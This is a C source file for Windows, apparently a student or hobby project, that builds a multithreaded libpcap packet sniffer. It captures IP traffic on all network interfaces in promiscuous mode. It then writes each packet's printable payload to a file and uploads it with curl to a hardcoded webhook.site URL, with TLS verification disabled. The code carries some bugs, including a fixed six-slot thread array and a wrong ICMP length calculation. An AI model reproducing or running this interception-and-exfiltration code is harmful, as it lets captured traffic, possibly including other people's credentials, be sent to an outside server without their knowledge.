#define APP_NAME		"sniffer"
#define APP_DESC		"Sniffer example using libpcap/curl/pthread"
#define APP_COPYRIGHT		"Copyright (c) 2021 The @myNameIsK1r4 and @bigger777
#define APP_DISCLAIMER		"THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM."
#define HAVE_STRUCT_TIMESPEC
#define HAVE_REMOTE
#include <pcap.h>

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>

#include <malloc.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>

#include <winsock.h>
#include <wsipv6ok.h>
#include <ws2tcpip.h>
#include <remote-ext.h>

#pragma comment(lib, "Ws2_32.lib")


#include <fcntl.h>
#include <sys/stat.h>
#include <curl/curl.h>
#pragma comment(lib,"curllib.lib") 

// mutex !
pthread_mutex_t mutexsend;
// for create threads
pthread_t callThd[6];

pthread_cond_t count_threshold_cv;

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
	unsigned char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
	unsigned char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
	u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
	u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
	u_char  ip_tos;                 /* type of service */
	u_short ip_len;                 /* total length */
	u_short ip_id;                  /* identification */
	u_short ip_off;                 /* fragment offset field */
#define IP_RF 0x8000            /* reserved fragment flag */
#define IP_DF 0x4000            /* don't fragment flag */
#define IP_MF 0x2000            /* more fragments flag */
#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
	unsigned char  ip_ttl;                 /* time to live */
	unsigned char  ip_p;                   /* protocol */
	u_short ip_sum;                 /* checksum */
	struct  in_addr ip_src, ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
	u_short th_sport;               /* source port */
	u_short th_dport;               /* destination port */
	tcp_seq th_seq;                 /* sequence number */
	tcp_seq th_ack;                 /* acknowledgement number */
	u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
	u_char  th_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
	u_short th_win;                 /* window */
	u_short th_sum;                 /* checksum */
	u_short th_urp;                 /* urgent pointer */
};

/* UDP */
struct sniff_udp {
	u_short uh_sport;
	u_short uh_dport;
	u_short uh_len;
	u_short uh_check;
	u_char  uh_offx2;               /* data offset, rsvd */
#define UH_OFF(th)      (((uh)->uh_offx2 & 0xf0) >> 4)
};
/* total udp header length: 8 bytes (=64 bits) */

struct sniff_icmp {
	BYTE type; // ICMP Error type
	BYTE code; // Type sub code
	u_short checksum;
	u_short id;
	u_short seq;
};


struct data_for_thread
{
	char dev[128];
	int num;
	char err[PCAP_ERRBUF_SIZE];
};


static size_t read_callback(char* ptr, size_t size, size_t nmemb, FILE* stream);

void send_payload_on_server(const u_char* payload, const int sized, const data_for_thread* data);

void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet);

void print_payload(const u_char* payload, int len);

void print_hex_ascii_line(const u_char* payload, int len, int offset);

void print_app_banner(void);

void print_app_usage(void);

void print_app_banner(void)
{

	printf("%s - %s\n", APP_NAME, APP_DESC);
	printf("%s\n", APP_COPYRIGHT);
	printf("%s\n", APP_DISCLAIMER);
	printf("\n");

	return;
}

void print_app_usage(void)
{

	printf("Usage: %s [interface]\n", APP_NAME);
	printf("\n");
	printf("Options:\n");
	printf("    interface    Listen on <interface> for packets.\n");
	printf("\n");

	return;
}

void print_hex_ascii_line(const u_char* payload, int len, int offset)
{

	int i;
	int gap;
	const u_char* ch;

	/* offset */
	printf("%05d   ", offset);

	/* hex */
	ch = payload;
	for (i = 0; i < len; i++) {
		printf("%02x ", *ch);
		ch++;
		/* print extra space after 8th byte for visual aid */
		if (i == 7)
			printf(" ");
	}
	/* print space to handle line less than 8 bytes */
	if (len < 8)
		printf(" ");

	/* fill hex gap with spaces if not full line */
	if (len < 16) {
		gap = 16 - len;
		for (i = 0; i < gap; i++) {
			printf("   ");
		}
	}
	printf("   ");

	/* ascii (if printable) */
	ch = payload;

	// мы лишь раскодим байты и наблюдаем текст, но не сохраняем его
	for (i = 0; i < len; i++) {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");

		ch++;
	}

	printf("\n");

	return;
}


// print packet payload data (avoid printing binary data)
void print_payload(const u_char* payload, int len)
{

	int len_rem = len;
	int line_width = 16;			/* number of bytes per line */
	int line_len;
	int offset = 0;					/* zero-based offset counter */
	const u_char* ch = payload;

	if (len <= 0)
		return;

	// data fits on one line 
	if (len <= line_width) {
		print_hex_ascii_line(ch, len, offset);
		return;
	}

	// data spans multiple lines 
	for (;; ) {
		// compute current line length 
		line_len = line_width % len_rem;
		// print line 
		print_hex_ascii_line(ch, line_len, offset);
		// compute total remaining 
		len_rem = len_rem - line_len;
		// shift pointer to remaining bytes to print 
		ch = ch + line_len;
		// add offset 
		offset = offset + line_width;
		// check if we have line width chars or less 
		if (len_rem <= line_width) {
			// print last line and get out 
			print_hex_ascii_line(ch, len_rem, offset);
			break;
		}
	}

	return;
}

struct MyData
{
	FILE* file;

	MyData(FILE* f)
	{
		file = f;
	}
};

static size_t read_callback(char* ptr, size_t size, size_t nmemb, FILE* stream)
{
	size_t retcode;
	curl_off_t nread;

	retcode = fread(ptr, size, nmemb, stream);

	nread = (curl_off_t)retcode;

	return retcode;
}

void send_payload_on_server(const u_char* payload, const int sized, const data_for_thread* data)
{
#define _CRT_SECURE_NO_WARNINGS

	CURL* curl;
	CURLcode res;

	FILE* file;
	struct stat file_info;
	const char* url;

	int i;

	url = "https://webhook.site/68e6d576-b47a-4929-9eb1-fae4c6ac3cb5";
	
	char filename[150] = "";
	snprintf(filename, sizeof(filename), "./file%d.txt", data->num);

	file = fopen(filename, "wb");
	if (NULL == file)
	{
		printf("Can't open file %s\n", filename);
		return;
	}

	for (i = 0; i < sized; i++) {
		if (isprint(payload[i]))
		{
			fputc(payload[i], file);
			printf("%c", payload[i]);
		}
	}
	printf("\n");

	fclose(file);

	file = fopen(filename, "rb");
	stat(filename, &file_info);

	curl_global_init(CURL_GLOBAL_ALL);

	/* get a curl handle */
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, FALSE);

		curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);

		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

		curl_easy_setopt(curl, CURLOPT_URL, url);

		curl_easy_setopt(curl, CURLOPT_READDATA, file);

		curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE,
			(curl_off_t)file_info.st_size);

		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));

		curl_easy_cleanup(curl);
	}
	fclose(file);

	curl_global_cleanup();

}

void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
{
	pthread_mutex_lock(&mutexsend);
	static int count = 1;                   /* packet counter */
	pthread_mutex_unlock(&mutexsend);
	//char errbuf[PCAP_ERRBUF_SIZE];
	const struct sniff_ethernet* ethernet;  /* The ethernet header [1] */
	const struct sniff_ip* ip;              /* The IP header  */
	const struct sniff_tcp* tcp;            /* The TCP header */
	const struct sniff_udp* udp;			/* The UDP header */
	const struct sniff_icmp* icmp;			/* The ICMP header */

	data_for_thread* data = (data_for_thread*)args;
	const u_char* payload;           /* Packet payload */

	int size_ip;
	int size_tcp;
	int size_udp;
	int size_payload;

	printf("\nPacket number %d:\n", count);
	count++;

	/* define ethernet header */
	ethernet = (struct sniff_ethernet*)(packet);		// хэдэр заголовка ethernet
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);	// хэдэр заголовка ip
	icmp = (struct sniff_icmp*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip) * 4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
#define _WINSOCK_DEPRECATED_NO_WARNINGS

	/* print source and destination IP addresses */
	printf("       From: %s\n", inet_ntoa(ip->ip_src));
	printf("         To: %s\n", inet_ntoa(ip->ip_dst));

	/* determine protocol */
	u_short choise;
	switch (ip->ip_p) {
	case IPPROTO_TCP:
		choise = 1;
		printf("   Protocol: TCP\n");
		break;
	case IPPROTO_UDP:
		choise = 2;
		printf("   Protocol: UDP\n");
		break;
	case IPPROTO_ICMP:
		choise = 3;
		printf("   Protocol: ICMP\n");
		break;
	case IPPROTO_IP:
		choise = 4;
		printf("   Protocol: IP\n");
		break;
	default:
		choise = 5;
		printf("   Protocol: unknown\n");
		break;
	}

	// протокол определён

	if (choise % 2 == 0)
	{
		if (choise == 2)
		{
			// define udp header 
			udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + size_ip);
			size_udp = 8;

			printf("   Src port: %d\n", ntohs(udp->uh_sport));
			printf("   Dst port: %d\n", ntohs(udp->uh_dport));

			/* define/compute udp payload (segment) offset */
			// данные после заголовков 
			payload = (unsigned char*)(packet + SIZE_ETHERNET + size_ip + size_udp);

			/* compute tcp payload (segment) size */
			size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);

		}
		else if (choise == 4)
		{
			/* define ip header */
			payload = (unsigned char*)(packet + SIZE_ETHERNET);
			size_payload = ntohs(ip->ip_len);
		}
		else
		{
			printf("Packet not exists");
			return;
		}
	}
	else
	{
		if (choise == 1)
		{
			// define/compute tcp header offset 
			tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
			size_tcp = TH_OFF(tcp) * 4;
			if (size_tcp < 20) {
				printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
				return;
			}

			printf("   Src port: %d\n", ntohs(tcp->th_sport));
			printf("   Dst port: %d\n", ntohs(tcp->th_dport));

			/* define/compute tcp payload (segment) offset */
			// данные после заголовков 
			payload = (unsigned char*)(packet + SIZE_ETHERNET + size_ip + size_tcp);

			/* compute tcp payload (segment) size */
			size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
		}
		else if (choise == 3)
		{
			/* define icmp header */
			payload = (unsigned char*)(packet + SIZE_ETHERNET);
			size_payload = ntohs(icmp->seq);
		}
		else
		{
			printf("Packet not exists or it's unknown protocol");
			return;
		}
	}

	send_payload_on_server(payload, size_payload, (data_for_thread*)data);

	return;
}


void* start(void* data_for_thr)
{
	printf("***************** START *****************");
	pcap_t* handle;					/* packet capture handle */

	char filter_exp[] = "ip";		/* filter expression [3] */
	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;				/* subnet mask */
	bpf_u_int32 net;				/* ip */
	int num_packets = -1;			/* number of packets. -1 is infinity */
	char errbuf[PCAP_ERRBUF_SIZE];
	data_for_thread* data = (data_for_thread*)data_for_thr;
	*errbuf = *data->err;
	/* получаем номер сети и маску */
	if (pcap_lookupnet(data->dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
			data->dev, errbuf);
		net = 0;
		mask = 0;
	}
	/* принтим инфу по поиску */
	printf("Device: %s\n", data->dev);
	printf("Number of packets: %d\n", num_packets);
	printf("Filter expression: %s\n", filter_exp);


	handle = pcap_open_live(data->dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", data->dev, errbuf);
		printf("FUCK2\n");
		return (void*)1;
	}

	/* Если захватываем на Ethernet, убеждаемся в этом [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", data->dev);
		//exit(EXIT_FAILURE);
		printf("FUCK3\n");
		return (void*)1;
	}

	/* перед применением фильтра его надо скомпилировать */
	if (pcap_compile(handle, &fp, filter_exp, 1, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
			filter_exp, pcap_geterr(handle));
		//exit(EXIT_FAILURE);
		printf("FUCK4\n");
		return (void*)1;
	}

	/* применяем скомплированный фильтр */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
			filter_exp, pcap_geterr(handle));
		printf("FUCK5\n");
		return (void*)1;
	}

	pcap_loop(handle, num_packets, got_packet, (u_char*)data);


	/* cleaning */
	pcap_freecode(&fp);
	pcap_close(handle);

	printf("\nCapture complete.\n");
	return (void*)1;

}


int main(int argc, char** argv)
{
	pthread_attr_t attr;
	void* status;
	pcap_if_t* alldevs = NULL, * d;
	u_int len = 0, i, j;

	char* dev = NULL;					/* capture device name */
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */

	print_app_banner();

	if (argc == 2) {
		dev = argv[1];
	}
	else if (argc > 2) {
		fprintf(stderr, "error: unrecognized command-line options\n\n");
		print_app_usage();
		printf("FUCK1");
		return -1;
		//exit(EXIT_FAILURE);
	}
	else
	{
		printf("\nNo adapter selected: printing the device list:\n");

		if (pcap_findalldevs(&alldevs, errbuf))
		{
			fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
			return -1;
			
		}
		// print all interfaces
		for (d = alldevs; d; d = d->next)
		{
			printf("%d. %s\n    ", ++len, d->name);

			if (d->description)
			{
				printf(" (%s)\n", d->description);
			}
			else
				printf(" (No description available)\n");

		}

		if (len == 0)
		{
			fprintf(stderr, "No interfaces found! Exiting.\n");
			printf("FUCK1\n");
			return -1;
		}
	}

	data_for_thread* datas = (data_for_thread*)calloc(sizeof(data_for_thread), len);

	for (d = alldevs, i = 0; d; d = d->next, i++)
	{
		strncpy(datas[i].dev, d->name, sizeof(datas[i].dev));
		datas[i].num = i;
		*datas[i].err = *errbuf;
	}

	for (i = 0; i < len; i++)
	{
		printf("This INTERFACE is: %s\n", datas[i].dev);
	}


	const int num_of_threads = len;

	pthread_mutex_init(&mutexsend, NULL);

	pthread_attr_init(&attr);
	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);


	for (j = 0, d = alldevs; d; j++, d = d->next)
	{
		if (d)
			printf("Now, i create a %d thread:\n", j);
		pthread_create(&callThd[j], &attr, *start, &datas[j]);
	}

	pthread_attr_destroy(&attr);

	for (i = 0; i < len; i++)
	{
		pthread_join(callThd[i], &status);
	}

	pthread_mutex_destroy(&mutexsend);
	pthread_exit(NULL);

	return 0;
}

